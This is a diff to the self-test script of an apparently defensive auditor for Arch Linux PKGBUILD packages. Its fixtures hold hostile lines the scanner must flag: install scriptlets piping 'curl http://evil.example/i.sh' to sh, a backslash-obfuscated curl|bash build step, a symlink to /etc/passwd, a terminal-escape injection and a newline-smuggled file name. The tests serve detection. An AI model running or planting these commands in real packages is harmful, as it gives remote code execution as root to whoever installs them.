@@ -25,11 +25,23 @@ want_code() {  # fixture expected-exit
 }
 
 want_finding() {
-  grep -q "$2" "$tmp/$1.txt" || { fail_msg "$1 missing finding $2"; cat "$tmp/$1.txt"; }
+  python3 - "$tmp/$1.json" "$2" <<'PY' || { fail_msg "$1 missing finding $2"; cat "$tmp/$1.txt"; }
+import json, sys
+codes = {f["code"] for f in json.load(open(sys.argv[1]))["findings"]}
+raise SystemExit(0 if sys.argv[2] in codes else 1)
+PY
 }
 
 no_finding() {
-  grep -q "$2" "$tmp/$1.txt" && { fail_msg "$1 has unwanted finding $2"; cat "$tmp/$1.txt"; }
+  python3 - "$tmp/$1.json" "$2" <<'PY' && { fail_msg "$1 has unwanted finding $2"; cat "$tmp/$1.txt"; }
+import json, sys
+codes = {f["code"] for f in json.load(open(sys.argv[1]))["findings"]}
+raise SystemExit(0 if sys.argv[2] in codes else 1)
+PY
+}
+
+want_text() {
+  grep -q "$2" "$tmp/$1.txt" || { fail_msg "$1 missing text $2"; cat "$tmp/$1.txt"; }
 }
 
 json_clean() {  # no HIGH/MEDIUM
@@ -442,6 +454,54 @@ want_code echo_chain 2
 want_finding echo_chain net-fetch
 want_finding echo_chain pipe-to-shell
 
+# Scalar source/checksum declarations are valid bash and must still be reviewed.
+mk scalar_source <<'PKG'
+pkgname=scalar_source
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source="http://evil.example/x.tar.gz"
+sha256sums="0000000000000000000000000000000000000000000000000000000000000000"
+package(){ :; }
+PKG
+want_code scalar_source 2
+want_finding scalar_source insecure-scheme
+
+# A scalar validpgpkeys pins the key just like the array form.
+mk scalar_key <<PKG
+pkgname=scalar_key
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=("https://example.org/a.tar.gz" "a.sig::https://example.org/a.tar.gz.gpg")
+sha256sums=('$SUMH' 'SKIP')
+validpgpkeys=E1096BCBFF6D418796DE78515384CE82BA52C83A
+package(){ :; }
+PKG
+want_code scalar_key 0
+no_finding scalar_key signature-not-verified
+
+# A source array assigned only inside a called function is still a gap.
+mk fn_source <<'PKG'
+pkgname=fn_source
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+_helper() {
+  source=("https://evil.example/x.tar.gz")
+  sha256sums=('SKIP')
+}
+_helper
+package(){ :; }
+PKG
+want_code fn_source 0
+want_finding fn_source top-level-command
+want_finding fn_source array-index-unresolved
+want_text fn_source "REVIEW"
+
 # A command after a top-level assignment on the same line still runs.
 mk top_chain <<PKG
 pkgname=top_chain
@@ -456,6 +516,21 @@ package(){ :; }
 PKG
 want_code top_chain 2
 want_finding top_chain net-fetch
+
+# A non-rule command chained after an assignment is still top-level code.
+mk top_chain_plain <<PKG
+pkgname=top_chain_plain
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+x=1; ./shipped-payload.sh
+source=("https://example.org/a.tar.gz")
+sha256sums=('$SUMH')
+package(){ :; }
+PKG
+want_code top_chain_plain 0
+want_finding top_chain_plain top-level-command
 
 # A command after a function's closing brace on the same line still runs.
 mk fnline_chain <<PKG
@@ -505,9 +580,24 @@ want_code hyphen_fn 2
 want_finding hyphen_fn net-fetch
 no_finding hyphen_fn top-level-command
 
-# `.gpg` is a detached signature: SKIP is expected, not a HIGH.
-mk gpg_sig <<PKG
-pkgname=gpg_sig
+# `.gpg` is not a signature to makepkg: SKIP must block, not be exempt.
+mk gpg_not_sig <<PKG
+pkgname=gpg_not_sig
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=("https://example.org/a.tar.gz" "https://example.org/a.tar.gz.gpg")
+sha256sums=('$SUMH' 'SKIP')
+validpgpkeys=('E1096BCBFF6D418796DE78515384CE82BA52C83A')
+package(){ :; }
+PKG
+want_code gpg_not_sig 2
+want_finding gpg_not_sig skip-checksum
+
+# A renamed `.sig` is a signature to makepkg: SKIP is exempt, not a HIGH.
+mk sig_renamed <<PKG
+pkgname=sig_renamed
 pkgver=1
 pkgrel=1
 arch=('x86_64')
@@ -517,9 +607,9 @@ sha256sums=('$SUMH' 'SKIP')
 validpgpkeys=('E1096BCBFF6D418796DE78515384CE82BA52C83A')
 package(){ :; }
 PKG
-want_code gpg_sig 0
-no_finding gpg_sig skip-checksum
-no_finding gpg_sig signature-not-verified
+want_code sig_renamed 0
+no_finding sig_renamed skip-checksum
+no_finding sig_renamed signature-not-verified
 
 # A local .sig is still a snapshot file; with SKIP it is exempt, not a gap.
 mkdir -p "$tmp/local_sig"
@@ -664,6 +754,224 @@ want_finding local_suid privilege
 want_finding local_suid sandbox-weakened
 no_finding local_suid checksum-mismatch
 
+# --- assignments inside functions do not define the build-time array --------
+mkdir -p "$tmp/scoped_skip"
+printf 'EVILPAYLOAD' > "$tmp/scoped_skip/evil.tar.gz"
+scoped_sum=$(sha256sum "$tmp/scoped_skip/evil.tar.gz" | cut -d' ' -f1)
+cat > "$tmp/scoped_skip/PKGBUILD" <<PKG
+pkgname=scoped_skip
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=('evil.tar.gz')
+sha256sums=('SKIP')
+prepare() {
+  sha256sums[0]='$scoped_sum'
+}
+build(){ :; }
+package(){ :; }
+PKG
+want_code scoped_skip 2
+want_finding scoped_skip skip-checksum
+want_finding scoped_skip array-index-unresolved
+
+# A subshell assignment does not change the parent's checksum array either.
+mkdir -p "$tmp/subshell"
+printf 'EVILPAYLOAD' > "$tmp/subshell/evil.tar.gz"
+subshell_sum=$(sha256sum "$tmp/subshell/evil.tar.gz" | cut -d' ' -f1)
+cat > "$tmp/subshell/PKGBUILD" <<PKG
+pkgname=subshell
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=('evil.tar.gz')
+sha256sums=('SKIP')
+(
+  sha256sums[0]='$subshell_sum'
+)
+package(){ :; }
+PKG
+want_code subshell 2
+want_finding subshell skip-checksum
+want_finding subshell array-index-unresolved
+
+# --- `git+http://` is plaintext transport even though it is a VCS source ----
+mk git_http <<PKG
+pkgname=git_http
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=("git+http://evil.example/x.git")
+sha256sums=('SKIP')
+package(){ :; }
+PKG
+want_code git_http 2
+want_finding git_http insecure-scheme
+
+# --- top-level .install code runs as root when pacman sources the file ------
+mkdir -p "$tmp/inst_top"
+cat > "$tmp/inst_top/inst_top.install" <<'INST'
+curl -fsSL http://evil.example/i.sh | sh
+post_install() { :; }
+INST
+cat > "$tmp/inst_top/PKGBUILD" <<'PKG'
+pkgname=inst_top
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+install=inst_top.install
+source=()
+sha256sums=()
+package(){ :; }
+PKG
+want_code inst_top 2
+want_finding inst_top net-fetch
+want_finding inst_top pipe-to-shell
+
+# --- a declared install script in a subdirectory is still scanned -----------
+mkdir -p "$tmp/inst_subdir/hooks"
+cat > "$tmp/inst_subdir/hooks/evil.install" <<'INST'
+post_install() { curl -fsSL http://evil.example/i.sh | sh; }
+INST
+cat > "$tmp/inst_subdir/PKGBUILD" <<'PKG'
+pkgname=inst_subdir
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+install=hooks/evil.install
+source=()
+sha256sums=()
+package(){ :; }
+PKG
+want_code inst_subdir 2
+want_finding inst_subdir net-fetch
+
+# --- a comment between () and { does not hide the scriptlet body ------------
+mkdir -p "$tmp/inst_brace"
+cat > "$tmp/inst_brace/inst_brace.install" <<'INST'
+post_install() # runs as root
+{
+  curl -fsSL http://evil.example/i.sh | sh
+}
+INST
+cat > "$tmp/inst_brace/PKGBUILD" <<'PKG'
+pkgname=inst_brace
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+install=inst_brace.install
+source=()
+sha256sums=()
+package(){ :; }
+PKG
+want_code inst_brace 2
+want_finding inst_brace pipe-to-shell
+
+# --- root writes are found even behind an allowlisted shell keyword ---------
+mkdir -p "$tmp/inst_if"
+cat > "$tmp/inst_if/inst_if.install" <<'INST'
+post_install() {
+  if [ -d /usr/lib ]; then cp /tmp/x /usr/lib/x; fi
+}
+INST
+cat > "$tmp/inst_if/PKGBUILD" <<'PKG'
+pkgname=inst_if
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+install=inst_if.install
+source=()
+sha256sums=()
+package(){ :; }
+PKG
+want_code inst_if 0
+want_finding inst_if install-script-root-write
+
+# --- backslash obfuscation is normalized before rule matching ---------------
+mk obfuscated <<PKG
+pkgname=obfuscated
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=("https://example.org/a.tar.gz")
+sha256sums=('$SUMH')
+build() { c\\url -s https://evil.example/x | b\\ash; }
+package(){ :; }
+PKG
+want_code obfuscated 2
+want_finding obfuscated net-fetch
+want_finding obfuscated pipe-to-shell
+
+# --- quoted instructions are inert prose, not a build-time pipeline ---------
+mk quoted_msg <<PKG
+pkgname=quoted_msg
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=("https://example.org/a.tar.gz")
+sha256sums=('$SUMH')
+package() { msg "Install the helper with: curl -fsSL https://example.org/i.sh | bash"; }
+PKG
+want_code quoted_msg 0
+no_finding quoted_msg net-fetch
+no_finding quoted_msg pipe-to-shell
+
+# --- array-reference expansion is unresolved, not a count mismatch ----------
+mk array_ref <<PKG
+pkgname=array_ref
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+_files=('a.tar.gz' 'b.tar.gz')
+_dlpath="https://example.org/fonts"
+source=("\${_files[@]/#/\$_dlpath/}")
+sha256sums=('$SUMH' '$SUMH')
+package(){ :; }
+PKG
+want_code array_ref 0
+no_finding array_ref checksum-count-mismatch
+want_finding array_ref source-unresolved
+want_finding array_ref checksum-count-unresolved
+
+# --- SUID bits installed with `install -m` are a privilege finding ----------
+mk suid_install <<PKG
+pkgname=suid_install
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=("https://example.org/a.tar.gz")
+sha256sums=('$SUMH')
+package() { install -Dm4755 chrome-sandbox "\$pkgdir/usr/lib/x/chrome-sandbox"; }
+PKG
+want_code suid_install 0
+want_finding suid_install privilege
+
+# --- SHA-384 is a valid makepkg checksum algorithm -------------------------
+sha384_sum=$(printf 'a%.0s' {1..96})
+mk sha384 <<PKG
+pkgname=sha384
+pkgver=1
+pkgrel=1
+arch=('x86_64')
+license=('MIT')
+source=("https://example.org/a.tar.gz")
+sha384sums=('$sha384_sum')
+package(){ :; }
+PKG
+want_code sha384 0
+no_finding sha384 missing-checksums
+
 # --- launcher sandbox flags are a finding; a comment is not -----------------
 mk sandbox_wrapper <<'PKG'
 pkgname=sandbox_wrapper
@@ -716,7 +1024,7 @@ sha256sums=('$icon1_sum' '$icon2_sum')
 package(){ :; }
 PKG
 want_code icon_assets 0
-want_finding icon_assets "image assets"
+want_text icon_assets "image assets"
 [ "$(grep -c 'local-source' "$tmp/icon_assets.txt")" = 1 ] \
   || { fail_msg "icon_assets did not collapse local-source INFO"; cat "$tmp/icon_assets.txt"; }
 
@@ -784,10 +1092,13 @@ spec.loader.exec_module(a)
 with tempfile.TemporaryDirectory() as tmp:
     data = b"cached payload"
     name = "cached.tgz"
+    url = f"https://example.org/{name}"
     with open(os.path.join(tmp, name), "wb") as f:
         f.write(data)
+    with open(os.path.join(tmp, name + ".url"), "w") as f:
+        f.write(url + "\n")
     r = a.Report(package="demo")
-    src = a.Source(raw=f"https://example.org/{name}", url=f"https://example.org/{name}",
+    src = a.Source(raw=url, url=url,
                    line=3, scheme="https", vcs=False, sig=False, patch=False)
     src.resolved = src.url
     src.filename = name
@@ -799,9 +1110,36 @@ with tempfile.TemporaryDirectory() as tmp:
     raise SystemExit(0 if counts == (0, 1) and src.verify == "verified" else 1)
 PY
 
-# --- package inventory reports shipped SUID and launcher flags --------------
-if command -v bsdtar >/dev/null 2>&1; then
-  python3 - "$tmp/inspect-demo.tar.gz" <<'PY' || fail_msg "inspect fixture creation"
+# --- an unattributed same-named cache file is never hashed or deleted -------
+python3 - "$here/audit.py" <<'PY' || { fail_msg "foreign cache file handling"; }
+import hashlib, importlib.util, os, sys, tempfile
+spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
+a = importlib.util.module_from_spec(spec)
+sys.modules["audit"] = a
+spec.loader.exec_module(a)
+with tempfile.TemporaryDirectory() as tmp:
+    data = b"someone else's payload"
+    name = "other.tgz"
+    path = os.path.join(tmp, name)
+    with open(path, "wb") as f:
+        f.write(data)
+    r = a.Report(package="demo")
+    url = f"https://example.org/{name}"
+    src = a.Source(raw=url, url=url, line=3, scheme="https",
+                   vcs=False, sig=False, patch=False)
+    src.resolved = src.url
+    src.filename = name
+    src.sums = {"sha256sums": hashlib.sha256(b"expected").hexdigest()}
+    r.sources = [src]
+    a.urllib.request.urlopen = lambda *args, **kwargs: (_ for _ in ()).throw(
+        a.urllib.error.URLError("offline"))
+    a.verify_sources(r, {}, "/tmp", remote=True, cache_dir=tmp)
+    mismatch = [f for f in r.findings if f.code == "checksum-mismatch"]
+    raise SystemExit(0 if not mismatch and os.path.isfile(path) else 1)
+PY
+
+# --- package inventory reports shipped SUID, launchers, and .INSTALL -------
+python3 - "$tmp/inspect-demo.tar.gz" <<'PY' || fail_msg "inspect fixture creation"
 import io, sys, tarfile
 path = sys.argv[1]
 with tarfile.open(path, "w:gz") as t:
@@ -812,17 +1150,88 @@ with tarfile.open(path, "w:gz") as t:
         info.mtime = 0
         t.addfile(info, io.BytesIO(data))
     add(".PKGINFO", b"pkgname = demo\npkgver = 1-1\nlicense = MIT\n", 0o644)
+    add(".INSTALL", b"post_install() { :; }\n", 0o644)
     add("usr/bin/demo", b'#!/bin/sh\nexec /opt/demo --no-sandbox "$@"\n', 0o4755)
+    add("usr/bin/demo\nevil", b'#!/bin/sh\nexec /opt/demo --no-sandbox "$@"\n', 0o755)
     add("usr/share/applications/demo.desktop",
-        b"[Desktop Entry]\nExec=/usr/bin/demo\n", 0o644)
+        b"[Desktop Entry]\nExec=/usr/bin/demo\n# --no-sandbox is unsafe\n", 0o644)
 PY
-  inspect_out=$(python3 "$here/inspect_pkg.py" "$tmp/inspect-demo.tar.gz" 2>&1)
-  echo "$inspect_out" | grep -q 'setuid/setgid:' || fail_msg "inspect missing SUID section"
-  echo "$inspect_out" | grep -q 'usr/bin/demo' || fail_msg "inspect missing SUID path"
-  echo "$inspect_out" | grep -q -- '--no-sandbox' || fail_msg "inspect missing sandbox flag"
-else
-  echo "selftest: inspect_pkg skipped (bsdtar missing)"
-fi
+inspect_out=$(python3 "$here/inspect_pkg.py" "$tmp/inspect-demo.tar.gz" 2>&1)
+echo "$inspect_out" | grep -q 'setuid/setgid:' || fail_msg "inspect missing SUID section"
+echo "$inspect_out" | grep -q 'usr/bin/demo' || fail_msg "inspect missing SUID path"
+echo "$inspect_out" | grep -q -- '--no-sandbox' || fail_msg "inspect missing sandbox flag"
+echo "$inspect_out" | grep -q 'sha256=unreadable' && fail_msg "inspect could not read an escaped member"
+echo "$inspect_out" | grep -q '.INSTALL: present' || fail_msg "inspect missed .INSTALL"
+# demo + the newline-named launcher carry the flag; the desktop comment must not.
+[ "$(echo "$inspect_out" | grep -c 'flags:')" = 2 ] || fail_msg "inspect sandbox flag count"
+
+# --- per-architecture .SRCINFO arrays are compared, not silently dropped ----
+mkdir -p "$tmp/arch_srcinfo"
+cat > "$tmp/arch_srcinfo/PKGBUILD" <<'PKG'
+pkgname=arch_srcinfo
+pkgver=1
+pkgrel=1
+arch=('x86_64' 'aarch64')
+license=('MIT')
+source_x86_64=('https://example.org/a.tar.gz')
+source_aarch64=('https://example.org/b.tar.gz')
+sha256sums_x86_64=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
+sha256sums_aarch64=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
+depends_x86_64=('glibc' 'extra-dep')
+package(){ :; }
+PKG
+cat > "$tmp/arch_srcinfo/.SRCINFO" <<'SRC'
+pkgbase = arch_srcinfo
+	pkgver = 1
+	pkgrel = 1
+	arch = x86_64
+	arch = aarch64
+	license = MIT
+	depends_x86_64 = glibc
+	source_x86_64 = https://example.org/a.tar.gz
+	sha256sums_x86_64 = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+	source_aarch64 = https://example.org/b.tar.gz
+	sha256sums_aarch64 = e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+SRC
+want_code arch_srcinfo 0
+want_finding arch_srcinfo srcinfo-stale
+
+# --- snapshot links are validated and refused with a clean error -----------
+python3 - "$here/audit.py" "$tmp/link.tar.gz" <<'PY' || fail_msg "snapshot link handling"
+import importlib.util, io, sys, tarfile, tempfile
+spec = importlib.util.spec_from_file_location("audit", sys.argv[1])
+a = importlib.util.module_from_spec(spec)
+sys.modules["audit"] = a
+spec.loader.exec_module(a)
+path = sys.argv[2]
+with tarfile.open(path, "w:gz") as t:
+    info = tarfile.TarInfo("pkg/abs")
+    info.type = tarfile.SYMTYPE
+    info.linkname = "/etc/passwd"
+    t.addfile(info)
+with tempfile.TemporaryDirectory() as tmp, tarfile.open(path) as t:
+    try:
+        a.safe_extract(t, tmp)
+    except SystemExit:
+        raise SystemExit(0)
+    except Exception:
+        raise SystemExit(1)
+raise SystemExit(1)
+PY
+
+# --- control characters in package text are escaped in the human report -----
+mkdir -p "$tmp/escaped"
+python3 - "$tmp/escaped/PKGBUILD" <<'PY'
+import sys
+open(sys.argv[1], "w").write(
+    "pkgname=escaped\npkgver=1\npkgrel=1\narch=('x86_64')\nlicense=('MIT')\n"
+    "source=('https://example.org/a.tar.gz')\n"
+    "sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')\n"
+    "build() { sudo \\x1b]0;PWNED\\x07 curl http://evil.example/x; }\n"
+    "package(){ :; }\n")
+PY
+want_code escaped 2
+want_text escaped '\\x1b'
 
 # --- usage errors are not HIGH findings -------------------------------------
 python3 "$here/audit.py" > /dev/null 2>&1
